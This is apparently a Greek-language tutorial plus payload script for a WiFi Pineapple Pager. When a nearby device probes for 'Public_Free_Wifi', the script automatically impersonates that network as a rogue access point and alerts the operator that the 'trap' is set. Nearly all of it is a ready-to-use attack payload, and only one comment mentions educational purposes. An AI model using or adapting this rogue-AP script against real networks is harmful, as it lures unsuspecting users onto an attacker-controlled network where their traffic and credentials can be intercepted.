Αυτό το σενάριο κάνει παθητική σάρωση. Μόλις εντοπίσει ένα δίκτυο με το όνομα "Public_Free_Wifi", το μιμείται αμέσως (Rogue AP) και στέλνει μια οπτική και ηχητική ειδοποίηση.
✍️ Πώς Λειτουργεί
PINEAP START: Θέτει το Pager σε λειτουργία, αλλά το Rogue AP είναι ακόμα ανενεργό.
ON PROBE_REQUEST_SSID $TARGET_SSID: Αυτό είναι το κλειδί της "Alert-based Automation". Το Pager κάθεται και ακούει παθητικά.
PINEAP ADD_SSID $TARGET_SSID: Μόνο όταν μια συσκευή (client) στείλει ένα αίτημα ανίχνευσης (Probe Request) για το "Public_Free_Wifi", τότε και μόνο τότε το Pager αντιδρά και αρχίζει να εκπέμπει (Beaconing) το Fake AP.
BUZZER / LED / VIBRATE: Σας ειδοποιεί αμέσως. Γνωρίζετε ότι η παγίδα στήθηκε και ότι η συσκευή-στόχος βρίσκεται στην περιοχή.

# Payload Title: Simple_Recon_Engage.sh
# Target: WiFi Pineapple Pager

# 1. Καθορισμός Στόχου
# Ορίζουμε το SSID που θέλουμε να μιμηθούμε
TARGET_SSID="Public_Free_Wifi"

# 2. Ενεργοποίηση PineAP Engine
# Ξεκινά τη μηχανή Rogue AP και την αναμονή
PINEAP START

# 3. Ορισμός Trigger (Ερέθισμα)
# Περιμένει να ανιχνεύσει το συγκεκριμένο SSID
ON PROBE_REQUEST_SSID $TARGET_SSID

# 4. Action (Δράση) στο Trigger
# Μόλις το βρει, προσθέτει αυτόματα το SSID για μίμηση (Rogue AP)
PINEAP ADD_SSID $TARGET_SSID

# 5. Ειδοποίηση Pager
# Χρησιμοποιεί τα μοναδικά χαρακτηριστικά του Pager για άμεση ειδοποίηση
BUZZER 1
LED 1 GREEN
VIBRATE 1

# 6. Παρακολούθηση (Για εκπαιδευτικούς σκοπούς, ο κώδικας θα μπορούσε να συνεχίσει εδώ)
# BASH echo "Engaged $TARGET_SSID, check Pager screen for clients" >> /root/log.txt
